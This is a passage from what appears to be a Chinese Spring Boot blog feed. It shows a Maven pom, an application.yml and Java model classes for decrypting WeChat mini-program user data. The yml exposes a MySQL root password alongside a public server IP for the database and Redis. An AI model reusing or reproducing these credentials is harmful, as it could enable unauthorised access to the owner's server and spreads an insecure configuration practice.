class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>druid<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.1.10<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- 微信支付 --&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.httpcomponents/httpclient --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.httpcomponents<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>httpclient<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.5.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>slf4j-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.21<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>slf4j-simple<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.21<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- Redis --&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-data-redis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- RestTemplete --&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.httpcomponents<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>httpclient<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.5.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.bouncycastle<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>bcprov-jdk15on<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.57<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.jsonwebtoken<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jjwt<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.9.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-configuration-processor<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">optional</span>&gt;</span>true<span class="tag">&lt;/<span class="name">optional</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-lang3<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.8.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 微信支付--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">licenses</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">license</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">name</span>&gt;</span>The BSD 3-Clause License<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">url</span>&gt;</span>https://opensource.org/licenses/BSD-3-Clause<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">distribution</span>&gt;</span>repo<span class="tag">&lt;/<span class="name">distribution</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">license</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">licenses</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">scm</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url</span>&gt;</span><span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">connection</span>&gt;</span><span class="tag">&lt;/<span class="name">connection</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">developerConnection</span>&gt;</span><span class="tag">&lt;/<span class="name">developerConnection</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">scm</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">source</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">compilerArguments</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">bootclasspath</span>&gt;</span>$&#123;java.home&#125;/lib/rt.jar;$&#123;java.home&#125;/lib/jce.jar<span class="tag">&lt;/<span class="name">bootclasspath</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">compilerArguments</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-surefire-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.4.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">skipTests</span>&gt;</span>true<span class="tag">&lt;/<span class="name">skipTests</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">developers</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">developer</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">name</span>&gt;</span>wxpay<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">email</span>&gt;</span><span class="tag">&lt;/<span class="name">email</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">url</span>&gt;</span>https://pay.weixin.qq.com/wiki/doc/api/wxa/wxa_api.php?chapter=11_1<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">developer</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">developers</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">profiles</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">profile</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>release<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">distributionManagement</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">snapshotRepository</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">id</span>&gt;</span>oss<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">url</span>&gt;</span>https://oss.sonatype.org/content/repositories/snapshots/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">snapshotRepository</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">repository</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">id</span>&gt;</span>oss<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">url</span>&gt;</span>https://oss.sonatype.org/service/local/staging/deploy/maven2/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">repository</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">distributionManagement</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">profile</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">profiles</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="地表最强yml"><a href="#地表最强yml" class="headerlink" title="地表最强yml"></a>地表最强yml</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line"><span class="attr">  datasource:</span></span><br><span class="line"><span class="attr">    username:</span> <span class="string">root</span></span><br><span class="line"><span class="attr">    password:</span> <span class="string">obox11..</span></span><br><span class="line"><span class="attr">    url:</span> <span class="attr">jdbc:mysql://118.31.120.92:3306/obox</span></span><br><span class="line"><span class="attr">    driver-class-name:</span> <span class="string">com.mysql.jdbc.Driver</span></span><br><span class="line"><span class="attr">    type:</span> <span class="string">com.alibaba.druid.pool.DruidDataSource</span></span><br><span class="line"></span><br><span class="line"><span class="attr">  http:</span></span><br><span class="line"><span class="attr">    encoding:</span></span><br><span class="line"><span class="attr">      charset:</span> <span class="string">UTF-8</span></span><br><span class="line"><span class="attr">  cache:</span></span><br><span class="line"><span class="attr">    type:</span> <span class="string">redis</span></span><br><span class="line"></span><br><span class="line"><span class="attr">  redis:</span></span><br><span class="line"><span class="attr">    host:</span> <span class="number">118.31</span><span class="number">.120</span><span class="number">.92</span></span><br><span class="line"><span class="attr">    port:</span> <span class="number">6379</span></span><br><span class="line"><span class="attr">    database:</span> <span class="number">0</span></span><br><span class="line"><span class="attr">    timeout:</span> <span class="number">60</span><span class="string">s</span></span><br><span class="line"></span><br><span class="line"><span class="attr">    jedis:</span></span><br><span class="line"><span class="attr">      pool:</span></span><br><span class="line"><span class="attr">        max-active:</span> <span class="bullet">-1</span></span><br><span class="line"><span class="attr">        max-idle:</span> <span class="number">50</span></span><br><span class="line"><span class="attr">        max-wait:</span> <span class="bullet">-1</span><span class="string">s</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">initialSize:</span> <span class="number">5</span></span><br><span class="line"><span class="attr">minIdle:</span> <span class="number">5</span></span><br><span class="line"><span class="attr">maxActive:</span> <span class="number">20</span></span><br><span class="line"><span class="attr">maxWait:</span> <span class="number">60000</span></span><br><span class="line"><span class="attr">timeBetweenEvictionRunsMillis:</span> <span class="number">60000</span></span><br><span class="line"><span class="attr">minEvictableIdleTimeMillis:</span> <span class="number">300000</span></span><br><span class="line"><span class="attr">validationQuery:</span> <span class="string">SELECT</span> <span class="number">1</span> <span class="string">FROM</span> <span class="string">DUAL</span></span><br><span class="line"><span class="attr">testWhileIdle:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">testOnBorrow:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">testOnReturn:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">poolPreparedStatements:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line"><span class="attr">  port:</span> <span class="number">8080</span></span><br></pre></td></tr></table></figure></the>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;excerpt in=&quot;&quot; index=&quot;&quot; |=&quot;&quot; 首页摘要=&quot;&quot;&gt;&lt;br&gt;Springboot 一些常用配置&lt;/excerpt&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>springboot 整合 微信小程序</title>
    <link href="http://runindark.com/2019/08/07/springboot%E6%95%B4%E5%90%88%E5%BE%AE%E4%BF%A1/"/>
    <id>http://runindark.com/2019/08/07/springboot整合微信/</id>
    <published>2019-08-07T07:21:00.525Z</published>
    <updated>2019-08-07T07:43:21.487Z</updated>
    
    <content type="html"><![CDATA[<p><excerpt in="" index="" |="" 首页摘要=""><br>针对各种窒息的微信操蛋接口<br><a id="more"></a></excerpt></p><p><the rest="" of="" contents="" |="" 余下全文=""></the></p><h2 id="微信基本配置"><a href="#微信基本配置" class="headerlink" title="微信基本配置"></a>微信基本配置</h2><h3 id="微信支付API-DEMO"><a href="#微信支付API-DEMO" class="headerlink" title="微信支付API DEMO"></a>微信支付API DEMO</h3><blockquote><p>下载链接 ： <a href="https://pay.weixin.qq.com/wiki/doc/api/jsapi.php?chapter=11_1" target="_blank" rel="noopener">https://pay.weixin.qq.com/wiki/doc/api/jsapi.php?chapter=11_1</a></p></blockquote><h3 id="微信EncryptedData解密"><a href="#微信EncryptedData解密" class="headerlink" title="微信EncryptedData解密"></a>微信EncryptedData解密</h3><ol><li><p>EncryptedData Model</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.obox.obox.model.WxLogin;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EncryptedData</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String avatarUrl ;</span><br><span class="line">    <span class="keyword">private</span> String openId ;</span><br><span class="line">    <span class="keyword">private</span> String nickName ;</span><br><span class="line">    <span class="keyword">private</span> String gender ;</span><br><span class="line">    <span class="keyword">private</span> String city ;</span><br><span class="line">    <span class="keyword">private</span> String province ;</span><br><span class="line">    <span class="keyword">private</span> String country ;</span><br><span class="line">    <span class="keyword">private</span> String unionId ;</span><br><span class="line">    <span class="keyword">private</span> Watermark watermark ;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getAvatarUrl</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> avatarUrl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAvatarUrl</span><span class="params">(String avatarUrl)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.avatarUrl = avatarUrl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getOpenId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> openId;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setOpenId</span><span class="params">(String openId)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.openId = openId;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getNickName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> nickName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setNickName</span><span class="params">(String nickName)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.nickName = nickName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getGender</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> gender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setGender</span><span class="params">(String gender)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.gender = gender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getCity</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> city;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCity</span><span class="params">(String city)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.city = city;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getProvince</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> province;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setProvince</span><span class="params">(String province)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.province = province;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getCountry</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> country;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCountry</span><span class="params">(String country)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.country = country;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getUnionId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> unionId;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUnionId</span><span class="params">(String unionId)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.unionId = unionId;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Watermark <span class="title">getWatermark</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> watermark;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setWatermark</span><span class="params">(Watermark watermark)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.watermark = watermark;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>Encrycode Model</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.obox.obox.model.WxLogin;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Encrycode</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String session_key ;</span><br><span class="line">    <span class="keyword">private</span> String encrypted_data ;</span><br><span class="line">    <span class="keyword">private</span> String iv ;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getSession_key</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> session_key;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSession_key</span><span class="params">(String session_key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.session_key = session_key;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getEncrypted_data</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> encrypted_data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setEncrypted_data</span><span class="params">(String encrypted_data)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.encrypted_data = encrypted_data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getIv</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> iv;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setIv</span><span class="params">(String iv)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iv = iv;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>EncryptedData解密</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 